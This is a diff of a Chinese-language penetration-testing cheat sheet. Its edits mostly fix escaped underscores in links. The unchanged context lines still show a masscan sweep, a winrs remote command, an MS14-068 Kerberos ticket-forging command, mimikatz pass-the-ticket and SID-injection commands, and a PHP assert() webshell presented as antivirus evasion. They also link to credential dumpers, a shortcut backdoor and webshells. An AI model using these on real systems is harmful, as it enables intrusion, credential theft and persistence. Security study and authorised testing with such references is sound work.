@@ -189,7 +189,7 @@ sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 
 **github**
 
-* Github\_Nuggests（自动爬取Github上文件敏感信息泄露） :[https://github.com/az0ne/Github\_Nuggests](https://github.com/az0ne/Github\_Nuggests)
+* Github\_Nuggests（自动爬取Github上文件敏感信息泄露） :[https://github.com/az0ne/Github\_Nuggests](https://github.com/az0ne/Github_Nuggests)
 * GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :[https://github.com/FeeiCN/GSIL](https://github.com/FeeiCN/GSIL)
 * x-patrol(小米团队的):[https://github.com/MiSecurity/x-patrol](https://github.com/MiSecurity/x-patrol)
 
@@ -203,7 +203,7 @@ sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 * 虎妈查:[http://www.whomx.com/](http://www.whomx.com/)
 * 历史漏洞查询 :
   * 在线查询:[http://wy.zone.ci/](http://wy.zone.ci/)
-  * 自搭建:[https://github.com/hanc00l/wooyun\_publi/](https://github.com/hanc00l/wooyun\_publi/)
+  * 自搭建:[https://github.com/hanc00l/wooyun\_publi/](https://github.com/hanc00l/wooyun_publi/)
 
 **google hacking**
 
@@ -212,7 +212,7 @@ sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 **字典列表**
 
 * passwordlist:[https://github.com/lavalamp-/password-lists](https://github.com/lavalamp-/password-lists)
-* 猪猪侠字典:[https://pan.baidu.com/s/1dFJyedz](https://pan.baidu.com/s/1dFJyedz) [Blasting\_dictionary](https://github.com/rootphantomer/Blasting\_dictionary)（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等）
+* 猪猪侠字典:[https://pan.baidu.com/s/1dFJyedz](https://pan.baidu.com/s/1dFJyedz) [Blasting\_dictionary](https://github.com/rootphantomer/Blasting_dictionary)（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等）
 * 针对特定的厂商，重点构造厂商相关域名的字典
 
 ```markup
@@ -314,11 +314,11 @@ ls xxx.yyy.cn #列出域信息
 >
 > 是指需要在对应用的业务逻辑、认证方式等非常熟悉的情况下才能找到的漏洞，例如权限绕过等。
 >
-> **漏洞的复杂性：**有时候需要多个漏洞一起结合利用
+> **漏洞的复杂性：**&#x6709;时候需要多个漏洞一起结合利用
 
 ### OWASP Top10
 
-> **1.注入：**SQL注入、OS注入(命令执行)、LDAP注入 **2.失效的身份认证和会话管理：**弱口令爆破、不安全的散列密码加密(MD5爆破) **3.敏感数据泄漏：**源码泄漏、配置文件暴露、www.zip备份文件、默认后台 **4.XML外部实体(XXE)** **5.失效的访问控制：**管理页面仅能管理员权限访问；越权漏洞(垂直越权、水平越权); JWT-Cookie伪造 **6.安全配置错误：**开放了不必要的功能(445端口、网页-默认安装页面未删除、页面报错)、默认密码或空密码 **7.跨站脚本(XSS)** **8.不安全的反序列化：**java、php、python **9.使用含有已知漏洞的组件：**未打补丁的系统和组件、使用有已知漏洞的框架版本 **10.不足的日志记录和监控：**代码被删除，日志被修改，无法溯源；应该记录登陆失败次数；监控问题没被管理员响应
+> **1.注入：**&#x53;QL注入、OS注入(命令执行)、LDAP注入 **2.失效的身份认证和会话管理：**&#x5F31;口令爆破、不安全的散列密码加密(MD5爆破) **3.敏感数据泄漏：**&#x6E90;码泄漏、配置文件暴露、www.zip备份文件、默认后台 **4.XML外部实体(XXE)** **5.失效的访问控制：**&#x7BA1;理页面仅能管理员权限访问；越权漏洞(垂直越权、水平越权); JWT-Cookie伪造 **6.安全配置错误：**&#x5F00;放了不必要的功能(445端口、网页-默认安装页面未删除、页面报错)、默认密码或空密码 **7.跨站脚本(XSS)** **8.不安全的反序列化：**&#x6A;ava、php、python **9.使用含有已知漏洞的组件：**&#x672A;打补丁的系统和组件、使用有已知漏洞的框架版本 **10.不足的日志记录和监控：**&#x4EE3;码被删除，日志被修改，无法溯源；应该记录登陆失败次数；监控问题没被管理员响应
 
 ### 渗透测试CheckList
 
@@ -347,7 +347,7 @@ ls xxx.yyy.cn #列出域信息
 
 &#x20;[https://github.com/LandGrey/ClassHound](https://github.com/LandGrey/ClassHound)
 
-&#x20;[https://github.com/Artemis1029/Java\_xmlhack](https://github.com/Artemis1029/Java\_xmlhack)
+&#x20;[https://github.com/Artemis1029/Java\_xmlhack](https://github.com/Artemis1029/Java_xmlhack)
 
 ### 社工打点
 
@@ -376,7 +376,7 @@ ls xxx.yyy.cn #列出域信息
 * SQL注入
 * 跨站脚本（XSS）
 * 跨站请求伪造（CSRF）
-* SSRF（[ssrf\_proxy](https://github.com/bcoles/ssrf\_proxy)）
+* SSRF（[ssrf\_proxy](https://github.com/bcoles/ssrf_proxy)）
 * 功能/业务逻辑漏洞
 * 其他漏洞等
 * CMS-内容管理系统漏洞
@@ -411,8 +411,8 @@ ls xxx.yyy.cn #列出域信息
 
 ### Fronting
 
-* [Domain Fronting](https://evi1cg.me/archives/Domain\_Fronting.html)
-* [Tor\_Fronting.](https://evi1cg.me/archives/Tor\_Fronting.html)
+* [Domain Fronting](https://evi1cg.me/archives/Domain_Fronting.html)
+* [Tor\_Fronting.](https://evi1cg.me/archives/Tor_Fronting.html)
 
 ### 代理
 
@@ -651,7 +651,7 @@ winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd
 
 ### 内网跨边界转发
 
-* [NC端口转发](https://blog.csdn.net/l\_f0rm4t3d/article/details/24004555)
+* [NC端口转发](https://blog.csdn.net/l_f0rm4t3d/article/details/24004555)
 * [LCX端口转发](http://blog.chinaunix.net/uid-53401-id-4407931.html)
 * [nps](https://github.com/cnlh/nps) -> 个人用觉得比较稳定 ～
 * [frp](https://github.com/fatedier/frp)
@@ -1130,7 +1130,7 @@ windows用户列表 分析邮件用户，内网\[域]邮件用户，通常就是
 **Windows**
 
 * [mimikatz](https://github.com/gentilkiwi/mimikatz)
-* [wce](https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce\_v1\_42beta\_x64)
+* [wce](https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64)
 * [Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump)
 * [mimiDbg](https://github.com/giMini/mimiDbg)
 * [LaZagne](https://github.com/AlessandroZ/LaZagne)
@@ -1881,7 +1881,7 @@ HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}
 
 **28、快捷方式后门**
 
-替换我的电脑快捷方式启动参数 POC : [https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK\_backdoor.ps1](https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK\_backdoor.ps1)
+替换我的电脑快捷方式启动参数 POC : [https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK\_backdoor.ps1](https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1)
 
 **29、Logon Scripts**
 
@@ -1970,7 +1970,7 @@ PHP Meterpreter后门 Aspx Meterpreter后门 weevely webacoo\
 
 #### PHP
 
-**文件免杀（Apache、Nginx特性）**cmd
+**文件免杀（Apache、Nginx特性）**&#x63;md
 
 ```php
 <? assert(implode(reset(get_defined_vars())));	//返回由所有已定义变量所组成的数组    
@@ -2020,13 +2020,13 @@ killall apache2
 
 #### JSP
 
-Tomcat无文件Shell： [https://github.com/z1Ro0/tomcat\_nofile\_webshell](https://github.com/z1Ro0/tomcat\_nofile\_webshell)
+Tomcat无文件Shell： [https://github.com/z1Ro0/tomcat\_nofile\_webshell](https://github.com/z1Ro0/tomcat_nofile_webshell)
 
 冰蝎去特征（请参考酒仙桥六号部队的文章）
 
-[冰蝎，从入门到魔改](https://mp.weixin.qq.com/s/s\_DcLdhEtIZkC2\_z0Zz4FQ)
+[冰蝎，从入门到魔改](https://mp.weixin.qq.com/s/s_DcLdhEtIZkC2_z0Zz4FQ)
 
-[冰蝎改造之不改动客户端=>内存马](https://mp.weixin.qq.com/s?\_\_biz=MzU2NTc2MjAyNg==\&mid=2247484318\&idx=1\&sn=ece9e52218be0ea84ef166c3bfd20f23\&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188\&scene=126\&sessionid=1596615082\&key=4024143df9a90d6cf039e6e552bb5cc12f755fd25a44855e8dfaff85efc30720e50fd9f3299dbb007c78e96c833dc3df98a87f4c4a4e3ccff0084c0ad0325d06a0265851bfa777df7f014bc8d790632f\&ascene=1\&uin=MTUwNjgwNTkxMA%3D%3D\&devicetype=Windows+10+x64\&version=62090070\&lang=zh\_CN\&exportkey=AzFdHdxTih44P2kITVRk35s%3D\&pass\_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb)
+[冰蝎改造之不改动客户端=>内存马](https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==\&mid=2247484318\&idx=1\&sn=ece9e52218be0ea84ef166c3bfd20f23\&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188\&scene=126\&sessionid=1596615082\&key=4024143df9a90d6cf039e6e552bb5cc12f755fd25a44855e8dfaff85efc30720e50fd9f3299dbb007c78e96c833dc3df98a87f4c4a4e3ccff0084c0ad0325d06a0265851bfa777df7f014bc8d790632f\&ascene=1\&uin=MTUwNjgwNTkxMA%3D%3D\&devicetype=Windows+10+x64\&version=62090070\&lang=zh_CN\&exportkey=AzFdHdxTih44P2kITVRk35s%3D\&pass_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb)
 
 #### 隐藏WebShell
 
@@ -2300,7 +2300,7 @@ SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在�
 python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机
 ```
 
-利用mimikatz将工具得到的[TGT\_domainuser@SERVER.COM.ccache](mailto:TGT\_domainuser@SERVER.COM.ccache)写入内存，创建缓存证书：
+利用mimikatz将工具得到的[TGT\_domainuser@SERVER.COM.ccache](mailto:TGT_domainuser@SERVER.COM.ccache)写入内存，创建缓存证书：
 
 ```
 mimikatz.exe "kerberos::ptc c:TGT_darthsidious@pentest.com.ccache" exit
@@ -2528,7 +2528,7 @@ mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
 * 1、路由器 [routersploit](https://github.com/reverse-shell/routersploit)
 * 2、打印机 [PRET](https://github.com/RUB-NDS/PRET)
 * 3、IOT exp [https://www.exploitee.rs/](https://www.exploitee.rs/)
-* 4、相关 [OWASP-Nettacker](https://www.owasp.org/index.php/OWASP\_Nettacker) [isf](https://github.com/dark-lbp/isf) [icsmaster](https://github.com/w3h/icsmaster)
+* 4、相关 [OWASP-Nettacker](https://www.owasp.org/index.php/OWASP_Nettacker) [isf](https://github.com/dark-lbp/isf) [icsmaster](https://github.com/w3h/icsmaster)
 
 ### 中间人
 
